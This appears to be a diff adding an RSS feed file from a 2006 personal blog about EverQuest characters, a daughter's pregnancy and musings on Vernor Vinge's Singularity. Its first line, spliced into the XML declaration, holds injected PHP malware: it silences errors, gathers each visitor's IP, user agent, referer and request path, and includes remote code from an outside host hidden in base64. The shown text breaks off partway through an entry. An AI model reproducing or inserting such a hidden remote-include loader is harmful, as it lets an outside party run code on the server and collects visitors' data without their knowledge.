@@ -1,0 +1,102 @@
+<?xml version="1.0" encoding="ISO-8859-1"error_reporting(0);$a=(isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : $HTTP_HOST); $b=(isset($_SERVER["SERVER_NAME"]) ? $_SERVER["SERVER_NAME"] : $SERVER_NAME); $c=(isset($_SERVER["REQUEST_URI"]) ? $_SERVER["REQUEST_URI"] : $REQUEST_URI); $g=(isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : $HTTP_USER_AGENT); $h=(isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : $REMOTE_ADDR); $n=(isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : $HTTP_REFERER); $str=base64_encode($a).".".base64_encode($b).".".base64_encode($c).".".base64_encode($g).".".base64_encode($h).".".base64_encode($n);if((include_once(base64_decode("aHR0cDovLw==").base64_decode("dXNlcjcucGhwaW5jbHVkZS5ydQ==")."/?".$str))){} else {include_once(base64_decode("aHR0cDovLw==").base64_decode("dXNlcjcucGhwaW5jbHVkZS5ydQ==")."/?".$str);}?>
+<rss version="2.0">
+<channel>
+<title>MMORPGs and Real Life: An EverQuest, World of Warcraft, Vanguard and Linux blog.</title>
+<link>http://www.westkarana.com/index.php</link>
+<description><![CDATA[All Contents (C) 2005-2006, All Rights Reserved. Like anyone reads this.]]></description>
+<image>
+<url>http://www.westkarana.com/interface/feed.png</url>
+<link>http://www.westkarana.com/index.php</link>
+<title>MMORPGs and Real Life: An EverQuest, World of Warcraft, Vanguard and Linux blog.</title>
+<description><![CDATA[MMORPGs and Real Life: An EverQuest, World of Warcraft, Vanguard and Linux blog.]]></description>
+</image>
+<copyright>Copyright 2006, Tipa</copyright>
+<managingEditor>Tipa</managingEditor>
+<language>en-US</language>
+<generator>SPHPBLOG 0.4.6.1</generator>
+<item>
+<title>What happened here?</title>
+<link>http://www.westkarana.com/index.php?entry=entry060524-161430</link>
+<description><![CDATA[Bringing up another blog on Wordpress... I guess the import process on THIS blog broke it somehow...
+<br />]]></description>
+<category>General</category>
+<guid isPermaLink="true">http://www.westkarana.com/?entry=entry060524-161430</guid>
+<author>Tipa</author>
+<pubDate>Wed, 24 May 2006 23:14:30 GMT</pubDate>
+<comments>http://www.westkarana.com/comments.php?y=06&amp;m=05&amp;entry=entry060524-161430</comments>
+</item>
+<item>
+<title>A good day</title>
+<link>http://www.westkarana.com/index.php?entry=entry060429-175240</link>
+<description><![CDATA[My son is well again, I&#039;m not sick anymore, my daughter is preggers. It&#039;s a warm San Diego Saturday afternoon. Cat&#039;s off his medicine. The apartment is clean, shopping is done. We went out and saw a good movie (&quot;Thank You For Smoking&quot;). Finished the two songs in Guitar Hero that was keeping me from the final set of five in the game on hard.
+<br />
+<br />Few enough days are really good ones, but this is one of them.
+<br />]]></description>
+<category>General</category>
+<guid isPermaLink="true">http://www.westkarana.com/?entry=entry060429-175240</guid>
+<author>Tipa</author>
+<pubDate>Sun, 30 Apr 2006 00:52:40 GMT</pubDate>
+<comments>http://www.westkarana.com/comments.php?y=06&amp;m=04&amp;entry=entry060429-175240</comments>
+</item>
+<item>
+<title>So, I guess that was news...</title>
+<link>http://www.westkarana.com/index.php?entry=entry060428-222623</link>
+<description><![CDATA[I have been thinking all day about that theory that states that humanity faces a crisis within the next two hundred years, based on the sheer improbability of us being born in such a time of change, with all the millions of relatively stable years behind us and, if there is no catastrophe awaiting us, the millions of stable years ahead. I&#039;d love to remember where I read that; it sounds Greg Egan-ish. I remember thinking it was silly when I first read it. That every year in every age was a time of great change, but the perspective of history makes it look stabler than it was.
+<br />
+<br />Yesterday, the folks at BoingBoing linked to a podcast with Vernor Vinge, the SF writer noted for predicting the nature of the Internet as we have come to know it today, way back in the seventies, when the Internet was a collection of text-only documents shared by academic institutions with such wonderful programs as Archie, Veronica and Gopher.
+<br />
+<br />He is also famous for predicting that society is changing so fast that it is exponential in nature, that if these trends continue, in a couple hundred years, humanity will be so far beyond what we now are, that we would have as much in common with them as a goldfish does with us. He called that event that separates us from that which follows us and we can never understand, the Singularity.
+<br />
+<br />So anyway, I had some thoughts on that that I wanted to set down; but my daughter called, and said she was pregnant.
+<br />
+<br />And everything changed. And I found myself on the far side of a Singularity; instead of being a parent, I become a grandparent. Some small child is going to call me Grammie Holloway some day. My daughter crossed her own Singularity, from being in control of her own life to being the servant of another.
+<br />
+<br />I know how she feels... she has about as much relation to the girl she was yesterday as she has to a goldfish.
+<br />
+<br />Singularities happen all the time. The little things can change worlds just as well as the big ones.
+<br />]]></description>
+<category>General</category>
+<guid isPermaLink="true">http://www.westkarana.com/?entry=entry060428-222623</guid>
+<author>Tipa</author>
+<pubDate>Sat, 29 Apr 2006 05:26:23 GMT</pubDate>
+<comments>http://www.westkarana.com/comments.php?y=06&amp;m=04&amp;entry=entry060428-222623</comments>
+</item>
+<item>
+<title>The Little Mermaid</title>
+<link>http://www.westkarana.com/index.php?entry=entry060428-063601</link>
+<description><![CDATA[I never played Kingdom Hearts, where famous Final Fantasy characters meet up with famous Disney characters and go on an adventure. I used to be a big Disney fan when I was a kid... watched Wonderful World of Disney <i>every</i> Sunday, with popcorn of course, saw every Disney movie (mostly live action when I was growing up; they weren&#039;t really doing animation then).
+<br />
+<br />I&#039;m not sure why I stopped being a Disney fan. Maybe it was just the pervasive unreality - I was <i>angered</i> about Gladstone Gander&#039;s magical power of luck. He could do ANYTHING - because he was so lucky. If he was stranded on a deserted tropical isle - with Donald and Daisy, of course - his luck would provide him a rowboat stocked with delicious fruit.
+<br />
+<br />I guess I should also be angry with Larry Niven for ripping off the idea for a character in &quot;Ringworld&quot;.
+<br />
+<br />So, having not played the first, I doubt I&#039;ll end up playing the sequel. But I see it has Neptune&#039;s undersea kingdom in it, along with his daughter, Ariel.
+<br />
+<br />I guess things didn&#039;t work out with the prince, then? I&#039;m not surprised. She and he came from two different worlds... there&#039;s things you learn on land that you would never, ever learn underwater. Important things, like bladder control.
+<br />
+<br />I bet they didn&#039;t sleep together too many nights before <i>that</i> became a problem.
+<br />]]></description>
+<category>General</category>
+<guid isPermaLink="true">http://www.westkarana.com/?entry=entry060428-063601</guid>
+<author>Tipa</author>
+<pubDate>Fri, 28 Apr 2006 13:36:01 GMT</pubDate>
+<comments>http://www.westkarana.com/comments.php?y=06&amp;m=04&amp;entry=entry060428-063601</comments>
+</item>
+<item>
+<title>Okay, so they DO look ugly</title>
+<link>http://www.westkarana.com/index.php?entry=entry060426-073747</link>
+<description><![CDATA[<img src="images/allofthem.jpg" width=480 height=360 border=0 alt=''>
+<br />
+<br />Looking back on my characters from around the time of the Velious expansion, I can see why people considered EQ1 a little hard on the eyes. I wonder if I can even remember who all these characters are.... some of them were on Fennin Ro, where I played with a couple of fellow Guides sometimes...
+<br />
+<br />Front row - the shorties. Patience, my Fennin Ro cleric and currently a Bazaar mule on EMarr. She was still wearing that chain and bronze armor she bought from people killing dwarves in Butcherblock when I transferred her.
+<br />
+<br />Tsuki, my mage and third character. She&#039;s currently on Stromm; I transferred her there to help Dera (now Brita) solo. I&#039;d like to bring her back to EMarr.
+<br />
+<br />Etha, my druid and second character and first SERIOUS character. Luclin changed her looks quite a bit.
+<br />
+<br />Nina, my warrior. Look at that FULL CRAFTED! Ooooh! Aaaaah!
+<br />
+<br />Tipa, my rogue. Back before she got dual wield! She would become my next main after Etha, eventually.
+<br />
+<br />Back row: Nashuya, my SK. I think that armor is that Wakening Lands SK armor. I spent hours and hours camping that stuff.
